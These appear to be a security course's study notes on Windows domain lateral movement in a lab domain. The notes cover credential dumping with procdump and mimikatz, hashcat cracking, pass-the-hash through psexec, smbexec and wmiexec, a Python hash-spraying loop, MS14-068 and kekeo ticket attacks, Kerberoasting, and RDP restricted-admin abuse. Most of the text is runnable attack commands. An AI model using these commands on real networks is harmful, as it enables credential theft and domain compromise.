<h3 id="day67-内网安全-域横向smb-amp-wmi明文或hash传递"><a href="#day67-内网安全-域横向smb-amp-wmi明文或hash传递" class="headerlink" title="day67-内网安全-域横向smb&amp;wmi明文或hash传递"></a>day67-内网安全-域横向smb&amp;wmi明文或hash传递</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码</span><br><span class="line">windows2012以下版本如安装KB2871997补丁，无法获得明文密码</span><br><span class="line">针对以上 <span class="number">4</span>种解决方式</span><br><span class="line"><span class="number">1</span>	<span class="built_in">hash</span>传递(pth ptk)	进行移动</span><br><span class="line"><span class="number">2</span>	利用其他服务协议(SMB WMI)进行<span class="built_in">hash</span>移动</span><br><span class="line"><span class="number">3</span>	利用注册表操作开启wdigest Auth值进行获取</span><br><span class="line"><span class="number">4</span>	利用工具或第三方平台(Hashcat)进行破解获取</span><br><span class="line"></span><br><span class="line">windows系统LM Hash及NTLM Hsh加密算法，个人系统在windows vista后，服务器系统在windows <span class="number">2003</span>以后，认证方式均为NTLM Hash</span><br><span class="line"></span><br><span class="line">注册表修改wdigest 改为<span class="number">1</span></span><br><span class="line">	reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">非官方自带</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例1-Procdump Mimikatz配合获取</span></span><br><span class="line">procdump是官方工具	如果上传mimikatz失败可以用procdump配合mimikatz获取</span><br><span class="line">	procdump -accepteula -ma lsass.exe lsass.dmp		<span class="comment">#lsass是取出来的密码</span></span><br><span class="line">    复制到mimikatz上执行</span><br><span class="line">    	privilege::debug</span><br><span class="line">    	sekurlsa::minidump lsass.dmp</span><br><span class="line">        sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat破解windows ntlm hash</span><br><span class="line">hashcat -a 0 -m 1000 file --force</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例2-域横向移动SMB服务利用-psexec，smbexec(官方自带)</span></span><br><span class="line">利用SMB服务可以通过明文或<span class="built_in">hash</span>传递来远程执行，条件<span class="number">445</span>端口服务开放</span><br><span class="line">	SMB		Server Message Block 网络协议</span><br><span class="line">    	被用于Web连接和客户端之间的信息沟通 最初目的是将DOS操作系统中本地文件接口<span class="string">&quot;中断13&quot;</span>改造为网络文件系统</span><br><span class="line"></span><br><span class="line">pstools上传至攻击主机</span><br><span class="line">psexec第一种 先有ipc链接，psexec需要明文或<span class="built_in">hash</span>传递</span><br><span class="line">	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span>\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line">    psexec \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> -s cmd	<span class="comment">#先有ipc链接 -s以system权限运行</span></span><br><span class="line">    </span><br><span class="line">psexec第二种 不用建立IPC直接提供明文账户密码</span><br><span class="line">	psexec \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> -u administrator -p Admin12345 -s cmd</span><br><span class="line">    <span class="comment">#官方Pstools无法采用hash连接	以下可能失败</span></span><br><span class="line">    	psexec -hashes :$HASH$ ./administrator@<span class="number">10.1</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line">    	psexec -hashes :$HASH$ domain/administrator@<span class="number">10.1</span><span class="number">.2</span><span class="number">.3</span></span><br><span class="line">    	psexec -hashes :..... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span></span><br><span class="line"></span><br><span class="line">非官方自带-参考impacket工具包使用，操作简单，容易被杀</span><br><span class="line">smbexec无需先ipc连接 明文或<span class="built_in">hash</span>传递</span><br><span class="line">	smbexec god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.21</span></span><br><span class="line">	smbexec -hashes :$HASH$ ./admin@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec -hashes :.... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br><span class="line">    smbexec -hashes :.... god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例3-域横向移动WMI服务利用-cscript，wmiexec，wmic</span></span><br><span class="line">WMI(Windows Management Instrumentation)通过<span class="number">135</span>端口利用，支持用户名明文或者<span class="built_in">hash</span>的方式进行认证，并且该方法不会在目标日志系统留下痕迹</span><br><span class="line"></span><br><span class="line">自带WMIC 明文传递 无回显</span><br><span class="line"></span><br><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span></span><br><span class="line">            </span><br><span class="line">自带cscript明文传递 有回显</span><br><span class="line">cscript //nologo wmiexec.vbs /shell <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> administrator Admin12345</span><br><span class="line"></span><br><span class="line">套件impacket wmiexec 明文或<span class="built_in">hash</span>传递 有回显exe版本</span><br><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :.... ./administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :.... god/administrator@<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例4-域横向移动以上服务hash批量利用-python编译exe</span></span><br><span class="line">pyinstaller.exe -F fuck_neiwang_002.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line"><span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line"><span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line"><span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line"><span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line"><span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line"><span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">os.system(<span class="built_in">exec</span>)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#	涉及资源</span><br><span class="line">https://github.com/hashcat/hashcat</span><br><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</span><br><span class="line">https://github.com/Sysinternals/ProcDump-for-Linux</span><br><span class="line">https://github.com/maaaaz/impacket-examples-windows</span><br></pre></td></tr></table></figure>

<h3 id="day68-内网安全-域横向PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#day68-内网安全-域横向PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="day68-内网安全-域横向PTH&amp;PTK&amp;PTT哈希票据传递"></a>day68-内网安全-域横向PTH&amp;PTK&amp;PTT哈希票据传递</h3><p><img src="C:\Users\hyy\Desktop\小迪2020.assets\640.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Kerberos协议具体工作方式</span><br><span class="line">	客户机讲明文密码进行NTLM哈希，然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功后创建TGT(Ticket-Granting Ticket)</span><br><span class="line">	将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line">	然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务)票证，并且对TGT进行检测</span><br><span class="line">	检测成功后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回客户机</span><br><span class="line">PTH(pass the hash) 		利用lm或者ntlm的值进行的渗透测试</span><br><span class="line">PTT(pass the ticket) 	利用的票据凭证TGT进行的渗透测试</span><br><span class="line">PTK(pass the key)		利用的ekeys aes256进行的渗透测试</span><br><span class="line"></span><br><span class="line">PTH在内网渗透中是一种经典的攻击方式，原理是攻击者可以直接通过LM Hash和NTLM Hash远程访问主机或服务 而不提供明文密码</span><br><span class="line">如果禁用了ntlm认证，Psexec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2,安装补丁kb2871997的win7/2008r2/2012等，可以使用aes keys代替NT hash来实现ptk攻击</span><br><span class="line">总结：KB2871997补丁后的影响</span><br><span class="line">pth:没打补丁用户都可以连接，打了补丁只能administrator连接</span><br><span class="line">ptk:打了补丁才能用户连接，采用aes256连接		???</span><br><span class="line">	https://www.freebuf.com/column/220740.html</span><br><span class="line"></span><br><span class="line">PTT攻击的部分不是简单的NTLM认证，它利用Kerbos协议进行攻击，常见三种攻击手法MS14-068,Golden ticket,SILVER ticket 简单来说就是将连接合法的票据注入到内存中实现连接</span><br><span class="line"></span><br><span class="line">其中Golden ticket(黄金票据) SILVER ticket(白银票据)属于权限维持技术</span><br><span class="line">ms14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管理权限，微软给出的补丁kb3011780</span><br><span class="line"></span><br><span class="line">传递</span><br><span class="line">	没打补丁 pth (lm ntlm)	所有用户</span><br><span class="line">	打补丁</span><br><span class="line">		pth (lm ntlm) administrator</span><br><span class="line">		ptk aes 所有用户	好像是打了补丁才能用</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例1-域横向移动PTH传递-mimikatz</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">        </span><br><span class="line">严谨些LM NTML最好都收集</span><br><span class="line">sekurlsa::ekeys				<span class="comment">#获取aes加密</span></span><br><span class="line">        </span><br><span class="line">PTH ntlm传递</span><br><span class="line">未打补丁得到工作组及域连接</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:...</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:...		<span class="comment">#workgroup连的是本地用户</span></span><br><span class="line">成功会弹出一个cmd窗口 此时说明god域内administrator用户可以连接了</span><br><span class="line">	<span class="built_in">dir</span> \\<span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>\c$\		<span class="comment">#红日2008r2</span></span><br><span class="line">                    </span><br><span class="line">攻击当前域控主机</span><br><span class="line">	net time /domain </span><br><span class="line">直接连接域控主机是无法连接的</span><br><span class="line">使用mimikatz进行攻击</span><br><span class="line">	sekurlsa::pth /user:administrator /domain:god /ntlm:...</span><br><span class="line">    指令没有ip是一种随机攻击，ip地址是前期信息收集的，连接时可以遍历ip地址</span><br><span class="line">    看哪个有回显</span><br><span class="line">    攻击成功反弹回来一个cmd</span><br><span class="line">    在这个cmd中进行连接</span><br><span class="line">    	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\c$</span><br><span class="line">	如果ip不识别，就换成计算机名</span><br><span class="line">    sekurlsa::pth /user:administrator /domain:workgroup /ntlm:...</span><br><span class="line">    	此处domain是一个工作组，直接连接到了主机的本地的Administered  ??</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例2-域横向移动PTK传递-mimikatz</span></span><br><span class="line">PTK aes256传递</span><br><span class="line">打补丁后的工作组及域连接</span><br><span class="line">sekurlsa::ekeys		<span class="comment">#获取aes </span></span><br><span class="line">	sekurlsa::pth /user:mary /domain:god.org /aes256:...</span><br><span class="line"></span><br><span class="line">传递</span><br><span class="line">	没打补丁 pth (lm ntlm)	所有用户</span><br><span class="line">   	打了补丁</span><br><span class="line">    	pth (lm ntlm) administrator</span><br><span class="line">        ptk aes 所有用户</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:mary /domain:god /aes256:....</span></span><br><span class="line">	弹出一个cmd窗口，尝试连接域内主机 </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域横向移动PTT传递-MS14068&amp;kekeo&amp;local  	类似web中伪造cookie</span></span><br><span class="line">第一种利用漏洞:</span><br><span class="line">   	能是实现普通用户直接获取域控system</span><br><span class="line"><span class="comment">#ms14-068 powershell执行</span></span><br><span class="line">	<span class="number">1.</span>查看当前sid whoami/user 		<span class="comment">#获取sid  </span></span><br><span class="line">    <span class="number">2.</span>mimikatz <span class="comment">#kerberos::purge			或者cnd中klist purge</span></span><br><span class="line">        //清空当前机器中所有凭证，如果有域成员凭证(低权限)会影响凭证伪造</span><br><span class="line">        mimikatz<span class="comment"># kerberos::list 	//查看当前机器凭证</span></span><br><span class="line">        mimikatz<span class="comment"># kerberos::ptc 票据文件 	//讲票据注入到内存中</span></span><br><span class="line">	<span class="number">3.</span>利用ms14-068生成TGT数据</span><br><span class="line">    	ms14-<span class="number">068.</span>exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">        ms14-<span class="number">068.</span>exe -u mary@god.org -s .... -d <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> -p admin!@<span class="comment">#45			#生成了TGT_mary@god.org.ccache文件</span></span><br><span class="line">    <span class="number">4.</span>票据注入内存</span><br><span class="line">    	mimikatz.exe <span class="string">&quot;kerberos::ptc TGT_mary@god.org.ccache&quot;</span> exit</span><br><span class="line">    <span class="number">5.</span>查看凭证列表 klist</span><br><span class="line">   	<span class="number">6.</span>利用 <span class="built_in">dir</span> \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\C$		<span class="comment">#失败</span></span><br><span class="line">        <span class="built_in">dir</span> \\owa.god.org\c$			<span class="comment">#此处需要使用计算机名</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="comment"># privilege::debug			管理员提升到system??</span></span><br><span class="line">win7命令行复制黏贴 编辑-标记-回车(黏贴)</span><br><span class="line">    </span><br><span class="line">第二种 使用工具kekeo</span><br><span class="line">    <span class="number">1.</span>生成票据</span><br><span class="line">        kekeo <span class="string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:...&quot;</span></span><br><span class="line">    <span class="number">2.</span>票据导入</span><br><span class="line">        kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br><span class="line">    <span class="number">3.</span>查看凭证klist</span><br><span class="line">    <span class="number">4.</span>利用net use载入</span><br><span class="line">		<span class="built_in">dir</span> \\主机名\c$		×××××</span><br><span class="line">第三种 利用本地票据(需要管理员权限)</span><br><span class="line">	sekurlsa::ticket /export</span><br><span class="line">    kerberos::ptt xxxxx.xxx.kirbi</span><br><span class="line"><span class="comment">#总结ptt传递不需要本地管理员权限，连接主机名连接，基于漏洞，工具，本地票据 ptt票据存活时间只有10个小时</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 国产Ladon内网杀器测试验收</span></span><br><span class="line">信息收集-协议扫描-漏洞探针-传递攻击</span><br></pre></td></tr></table></figure>

<h3 id="day69-域横向-CobaltStrike-amp-SPN-amp-RDP"><a href="#day69-域横向-CobaltStrike-amp-SPN-amp-RDP" class="headerlink" title="day69-域横向 CobaltStrike&amp;SPN&amp;RDP"></a>day69-域横向 CobaltStrike&amp;SPN&amp;RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">域环境</span><br><span class="line">	传递</span><br><span class="line">	漏洞</span><br><span class="line">	SPN</span><br><span class="line">		流程</span><br><span class="line">			探针SPN服务 请求服务票据 导出服务票据 破解服务票据 重写服务票据</span><br><span class="line">		服务</span><br><span class="line">			MSSQL WSMAN Exchange TERMSERV Hyper-V host</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1	域横向移动RDP传递-mimikatz</span></span><br><span class="line">	除了上述讲到的IPC，WMI，SMB等协议的连接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作</span><br><span class="line">    	RDP 	remote desktop protocol</span><br><span class="line">    RDP协议连接：判断对方远程桌面是否开启<span class="number">3389</span>端口</span><br><span class="line">    	自己测试 配置 计算机-属性-远程登陆</span><br><span class="line">    </span><br><span class="line">RDP明文密码连接</span><br><span class="line">    	Windows:mstsc</span><br><span class="line">            mstsc.exe /console /v:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /admin</span><br><span class="line">      	linux rdesktop <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>:<span class="number">3389</span></span><br><span class="line"></span><br><span class="line">RDP密文HASH连接</span><br><span class="line">windows Server需要开启 Restricted Admin mode，在Windows8<span class="number">.1</span> 和Windows Server <span class="number">2012</span> R2中默认开启，同时如果win7和windows server <span class="number">2008</span> r2安装了<span class="number">2871997</span>、<span class="number">2973351</span>补丁也支持；开启命令：</span><br><span class="line">	REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line">开启后运行</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:.... <span class="string">&quot;run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例2	域横向移动SPN服务，探针，请求，破解，重写</span></span><br><span class="line">https://www.cnblogs.com/backlion/p/<span class="number">8082623.</span>html</span><br><span class="line">    SPN 服务主体名称 是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。</span><br><span class="line">    攻击者使用有效的域用户身份验证票证(TGT)去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务账户加密票证，以便服务能够验证用户是否能够访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5,这意味着服务账户的NTLM密码哈希用于加密服务票证。攻击者讲收到TGS票据离线进行破解，即可得到目标服务账号的HASH，这个称之为Kerberoast攻击。如果有一个为域用户账户注册的任意SPN。那么该用户账户的明文密码的NTLM哈希值就将用于创建服务票据。这是Kerberoast攻击的关键</span><br><span class="line"></span><br><span class="line"><span class="comment">#探针</span></span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* |findstr <span class="string">&quot;MSSQL&quot;</span></span><br><span class="line">请求</span><br><span class="line">	Add-<span class="type">Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">&quot;xxxx&quot;</span>			<span class="comment">#xxxx是setspn查出来完整的</span></span><br><span class="line">    或者	mimikatz.exe <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line">导出</span><br><span class="line">	mimikatz.exe <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line">    用mimikatz导出生成的票据</span><br><span class="line">破解</span><br><span class="line">	python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">    python3 .\tgsrepcrack.py .\passwd.txt .\.....kirbi</span><br><span class="line">重写		<span class="comment">#500是administrator标识 512是管理员组标识</span></span><br><span class="line">	python kerkeoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u <span class="number">500</span></span><br><span class="line">    python kerkeoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g <span class="number">512</span></span><br><span class="line">    mimikatz.exe kerberos::ptt xxxx.kirbi		<span class="comment">#票据注入内存</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域横向移动测试流程 一把梭哈-Cobalt Strike</span></span><br><span class="line">启动-配置-监听-执行-提权-信息收集(网络，凭证，定位)-渗透</span><br><span class="line">	<span class="number">1.</span>关于启动及配置讲解</span><br><span class="line">    <span class="number">2.</span>关于提权及插件加载</span><br><span class="line">    <span class="number">3.</span>关于信息收集命令讲解</span><br><span class="line">    <span class="number">4.</span>关于视图自动化功能讲解</span><br><span class="line">    </span><br><span class="line">右键-会话-sleep-<span class="number">1</span> 		设置每次发包的时间 默认<span class="number">60.</span>..</span><br><span class="line">脚本管理器上传插件</span><br><span class="line"></span><br><span class="line">常用命令</span><br><span class="line">	getuid</span><br><span class="line">    net view</span><br><span class="line">    net computers</span><br><span class="line">    net dclist</span><br></pre></td></tr></table></figure>

